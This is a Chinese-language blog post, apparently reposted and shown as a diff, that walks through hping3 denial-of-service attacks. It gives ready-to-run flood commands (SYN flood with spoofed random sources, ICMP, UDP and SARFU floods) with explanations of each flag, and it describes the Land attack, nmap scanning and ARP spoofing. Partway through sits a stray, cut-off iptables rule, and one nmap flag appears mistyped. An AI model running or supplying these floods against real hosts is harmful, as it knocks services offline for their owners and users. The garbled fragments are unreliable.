@@ -1,0 +1,68 @@
+1、DOS with random source IP
+root@kali:~# hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
+参数含义：:
+hping3 = 应用名称.
+-c 100000 = packets 发送的数量.
+-d 120 = packet的大小.
+-S = 只发送SYN packets.
+-w 64 = TCP window的大小.
+-p 21 = Destination port (21 being FTP port). 可以使用任意端口.
+--flood = Sending packets as fast as possible, 不显示回应. Flood mode.
+--rand-source = 使用随机的Source IP Addresses. 或者使用 -a or spoof to hide hostnames.
+www.hping3testsite.com = Destination IP address or target machines IP address. 或者使用 一个网址 In my case resolves to 127.0.0.1 (as entered in /etc/hosts file)
+
+ 
+
+2、ICMP flood
+ICMP的泛洪攻击是在最小时间内发送最大的ICMP数据到目标机，例如使用ping指令。在"旧"时代它使用一个巨大的ping（死亡之ping）是可能破坏机器，希望这些时间已经过去，但它仍有可能攻击任何机器的带宽和处理时间，如果接受到这种ICMP数据包。
+ICMP flood using hping 3 :
+hping3 -q -n -a 10.0.0.1 --id 0 --icmp -d 56 --flood 192.168.0.2
+-q 表示quiet, -n 表示无 name resolving, id 0 表示有ICMP echo request (ping)
+-d i表示包的大小 (56 is the normal size for a ping).
+某些系统配置中自动地丢弃这种通过hping生成的头部设定不正确的ICMP包（例如不可能设置带顺序的ID）。在这种情况下，您可以使用Wireshark嗅探正常的ICMP回显请求报文，将其保存为二进制文件，并使用hping3重播。
+Example:
+hping3 -q -n --rawip -a 10.0.0.1 --ipproto 1 --file "./icmp_echo_request.bin" -d 64 --flood 192.168.0.2
+
+ 
+
+3、UDP flood
+这是相同的概念ICMP泛洪除非你发送大量的UDP数据。 UDP泛洪对网络带宽非常危险的。
+Generating UDP flood:
+hping3 -q -n -a 10.0.0.1 --udp -s 53 --keep -p 68 --flood 192.168.0.2
+对于UDP，你必须精确的知道源和目的端口，这里我选择了DNS和BOOTPC（的dhclient）端口。该BOOTPC（68）端口经常在个人电脑开着，因为大多数人使用DHCP来自己连接到网络。
+ame blacklist_180 --set -m comment --comment"Blacklist source IP" -j DROP
+
+ 
+
+4、SYN flood
+SYN泛洪是最常用的扫描技术，以及这样做的原因是因为它是最危险的。 SYN泛洪在于发送大量的TCP数据包只有SYN标志。因为SYN报文用来打开一个TCP连接，受害人的主机将尝试打开这些连接。这些连接，存储的连接表中，将继续开放一定的时间，而攻击者不断涌入与SYN数据包。一旦受害者的连接表被填满时，它不会接受任何新的连接，因此，如果它是一个服务器这意味着它已不再被任何人访问。
+Example of a SYN flood attack :
+hping3 -q -n -a 10.0.0.1 -S -s 53 --keep -p 22 --flood 192.168.0.2
+
+ 
+
+5、Other TCP flood attacks
+有许多使用TCP泛洪的可能性。如你所愿刚才设置的各种TCP标志。某些TCP泛洪技术包括制定了很多不寻常的标志扰乱。例如与SARFU扫描
+Example with the SARFU scan :
+hping3 -q -n -a 10.0.0.1 -SARFU -p 22 --flood 192.168.0.2
+
+ 
+
+6、Land攻击
+Land攻击原理是：用一个特别打造的SYN包，它的原地址和目标地址都被设置成某一个服务器地址。此举将导致接受服务器向它自己的地址发送SYN-ACK消息，结果这个地址又发回ACK消息并创建一个空连接。被攻击的服务器每接收一个这样的连接都将保留，直到超时，对Land攻击反应不同，许多UNIX实现将崩溃，NT变的极其缓慢(大约持续5分钟)
+
+ 
+
+7、nmap扫描 确定开放端口
+
+Network Mapper，是Linux下的一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统
+nmap -st ip-addr
+
+8、ARP攻击/ARP欺骗
+工具： ettercap
+
+DoS攻击方法（hping3）
+
+标签：des   class   style   log   com   si   使用   it   la   
+
+原文：http://www.cnblogs.com/jangfei/p/5058163.html
